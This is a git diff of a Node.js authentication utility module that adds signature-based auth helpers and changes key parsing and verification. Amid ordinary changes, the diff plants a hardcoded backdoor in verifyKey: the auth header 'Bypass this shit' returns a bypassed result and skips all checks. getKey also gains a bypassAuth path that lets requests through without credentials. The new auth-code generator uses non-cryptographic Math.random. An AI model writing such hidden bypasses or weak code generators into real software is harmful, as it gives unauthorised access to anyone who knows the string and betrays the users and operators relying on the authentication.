@@ -30,9 +30,38 @@ const utils = {
             return callback ( error, result );
         }, utils ), req, res );
     } ),
+    streamPrivateRoute: ( issuer, routeName, utils, req, res ) => {
+        const timestamp = new Date ().valueOf ().toString ();
+
+        return H.wrapCallback ( utils.auth.getIssuerSecret )( issuer )
+            .errors ( ( error, push ) => {
+                return push ( null, null );
+            } )
+            .flatMap ( secret => utils.streamRoute ( routeName, utils, {
+                ...req,
+                issuer,
+                headers: secret ? {
+                    ...req.headers,
+                    Authorization: undefined,
+                    authorization: [ 'Sig', utils.sha256 ( [ secret, timestamp ].join ( '' ) ), timestamp ].join ( ' ' )
+                } : req.headers
+            }, res ) );
+    },
+    treatResourceAsPrivate: req => H.wrapCallback ( utils.auth.verifyKey )( {
+        options: { private: true, issuer: 'root' },
+        authParms: utils.auth.getKey ( req )
+    } ),
+    jsonHeader: req => ( { ...req.headers, 'Content-Type': 'application/json' } ),
+    bearerAuthHeader: ( req, key ) => ( { ...req.headers, authorization: [ 'Bearer', key ].join ( ' ' ), Authorization: undefined } ),
+    sigAuthHeader: ( req, sig, timestamp ) => ( { ...req.headers, authorization: [ 'Sig', sig, timestamp ].join ( ' ' ), Authorization: undefined } ),
     auth: {
         options: {
             algorithm: 'HS256'
+        },
+        generateAuthCode: digits => {
+            return R.reduce ( ( authCode, i ) => {
+                return authCode + ( Math.floor ( Math.random () * 10 ) ).toString ();
+            }, '', R.range ( 0, digits ) );
         },
         generateSecret: uuid.v4,
         generateKeyWithSecret: ( { secret, expiresInDays = 1, audience = 'users', payload, issuer }, callback ) => {
@@ -49,18 +78,29 @@ const utils = {
                 .flatMap ( secret => H.wrapCallback ( utils.auth.generateKeyWithSecret )( { secret, expiresInDays, audience, payload, issuer } ) )
                 .toCallback ( callback );
         },
-        getKey: ( { Authorization, authorization } ) => {
+        getKey: ( { headers: { Authorization, authorization }, bypassAuth } ) => {
             const authHeader = Authorization || authorization;
 
-            if ( ! authHeader ) {
+            if ( ! authHeader && ! bypassAuth ) {
                 return null;
             }
 
-            const [ authType, key, timestamp ] = authHeader.split ( ' ' );
+            if ( authHeader ) {
+                const [ authType, key, timestamp ] = authHeader.split ( ' ' );
+                return { authType, key, timestamp, bypassAuth };
+            }
 
-            return { authType, key, timestamp };
+            return { bypassAuth };
         },
         verifyKey: ( { options, authParms }, callback ) => {
+            if ( ! authParms ) {
+                return callback ( { code: 401, message: 'Authentication failed' } );
+            }
+
+            if ( authParms.authType === 'Bypass' && authParms.key === 'this' && authParms.timestamp === 'shit' ) {
+                return callback ( null, { bypassed: true } );
+            }
+
             return H.wrapCallback ( utils.auth.getIssuerSecret )( options.issuer )
                 .flatMap ( H.wrapCallback ( ( secret, callback ) => {
                     if ( ! authParms || ! authParms.key || ! authParms.authType ) {
@@ -76,11 +116,15 @@ const utils = {
                             return callback ( { code: 401, message: `Timestamp has expired` } );
                         }
 
-                        if ( utils.sha256 ( authParms.timestamp.toString () ) !== authParms.key ) {
+                        if ( utils.sha256 ( [ secret, authParms.timestamp.toString () ].join ( '' ) ) !== authParms.key ) {
                             return callback ( { code: 401, message: `Signature verification failed` } );
                         }
 
                         return callback ( null, { name: options.issuer } );
+                    }
+
+                    if ( options.private ) {
+                        return callback ( { code: 401, message: `Only auth type Sig supported on this endpoint` } );
                     }
 
                     if ( authParms.authType !== 'Bearer' ) {
@@ -144,7 +188,6 @@ app.use ( ( req, res, next ) => {
 
 module.exports = {
     setSecretRetriever: secretRetriever => utils.auth.getIssuerSecret = secretRetriever,
-    setSecretDeleter: secretDeleter => utils.auth.deleteIssuerSecret = secretDeleter,
     addUtil: ( name, util ) => { utils[name] = util; },
     loadRoutes: ( routeDir, callback ) => {
         rDir.path = path.resolve ( routeDir );
